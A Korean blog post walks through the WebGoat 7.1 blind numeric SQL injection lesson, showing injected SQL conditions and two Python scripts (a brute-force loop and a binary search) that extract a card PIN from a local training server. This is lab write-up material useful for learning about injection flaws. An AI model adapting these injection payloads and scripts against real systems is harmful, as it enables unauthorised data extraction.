---
title: "Webgoat7.1 Blind Numberic SQL Injection"
layout: post
date: 2020-04-22
image: /assets/images/mark-img01.png
headerImage: false
tag:
- sql
- blind
- injection
- exploit
category: blog
author: pil9

---
 
![problem]({{site.url}}/images/blind_p.png){: class="center"}
<figcaption class="caption">Blind sql injection 문제</figcaption>  
<br>
pins DB 테이블에서 cc_number가 '1111222233334444'인 pin 값을 찾는 문제입니다.

문제에서 사전에 주어진 정보는 테이블명(pins), 필드명(cc_number), 101 입니다.

<br>
![problem]({{site.url}}/images/p2.png){: class="center"}
<figcaption class="caption">유효 pin값은 101부터</figcaption>
<br>
위와 같이 쿼리에 논리식 대입이 가능하므로 출력되는 결과값을 기준으로 pin 값을 유추해 내면 됩니다.  

결과값으로 'Invalid account number'가 출력되면 조건식이 맞지 않는 것을 알 수 있습니다.

가장 먼저 pin값 자리수를 유추해야 하므로 100, 1000, 10000 등의 단위로 아래의 쿼리값을 반복해서 확인합니다.

<pre><code class = "language-sql">예시)
101 and (select pin from pins where cc_number = '1111222233334444' > 1000)
</code></pre>

pin 값이 1000보다 클 경우에는 'Account number is valid'

10000보다 클 경우에는 'Invalid account number' 가 출력되므로

조건식을 만족하는 pin 값의 범위는 1000 < pin < 10000 임을 유추할 수 있습니다.

약 9천개의 쿼리값을 다 날려볼 수는 없으므로 아래와 같은 exploit 코드를 작성하여 flag 값을 얻을 수 있습니다.

<pre><code class = "language-python">import requests

cookie = {'JSESSIONID':"C665F3601E7F6DE3D7F0FBB35EDE83C5"}
url = "http://localhost:8080/WebGoat/attack?Screen=586116895&menu=1100"
attack = "101 and (select pin from pins where cc_number='1111222233334444')="

for i in range(1000,10000):

    params = {'account_number':attack+str(i)}

    r = requests.post(url,data=params,cookies=cookie)
    if 'Account number is valid.' in r.text:

        print ('Account Number:',i)
        exit()
</code></pre>

<pre><code class="language-python">//결과 값
Account Number: 2364
</code></pre>

추가로 flag값의 범위가 클 경우 위와 같은 코드로는 시간이 오래 걸리므로 아래 코드와 같이 이진 탐색등의 탐색 알고리즘을 사용하여 작성하시면 됩니다.

<pre><code class="language-python">import requests

# 이진 탐색 알고리즘을 통한 flag 탐색 함수
def search(pin_data):
    start=0
    end = len(pin_data) -1
    while start <= end:
        mid = (start + end) // 2

        # 중간 값이 한개이면 flag
        if (end-start) == 2:
            return mid
        data={'account_number':"101 and (select pin from pins where cc_number = '1111222233334444' >=" +
        str(mid) + ")"}
        res=s.post(url, data=data)
        
        if 'Account number is valid' in res.text:
            start = mid + 1
        else:
            end = mid -1

# 로그인 세션 처리는 첫번째 코드로 해도 상관없음
login_url = 'http://localhost:8080/WebGoat/j_spring_security_check'
login_data = {
    'username' : 'guest','password' : 'guest'
}
url = 'http://localhost:8080/WebGoat/attack?Screen=586116895&menu=1100'

with requests.Session() as s:
    # 로그인 및 세션 저장(as s)
    res = s.post(login_url, data=login_data, verify=False, allow_redirects=False)
    
    # pin 초기 값 set
    pin=1
    
    # pin 자릿수 탐색
    for i in range(10):
        data={'account_number':"101 and (select pin from pins where cc_number = '1111222233334444' >=" +
        str(pin) + ")"}
        res=s.post(url, data=data)
        if 'Invalid account number' in res.text:
            pin=int(pin/10)
            break
        pin=int(pin*10)
    
    # 이진 탐색을 위한 리스트 생성
    li = [i for i in range(pin,pin*10+1)]
    
    # 정상 pin 값 서칭
    flag = search(li)

    print("AC NUMBER :",flag)
                

</code></pre>

<pre><code class="language-python">//결과값
AC Number: 2364
</code></pre>




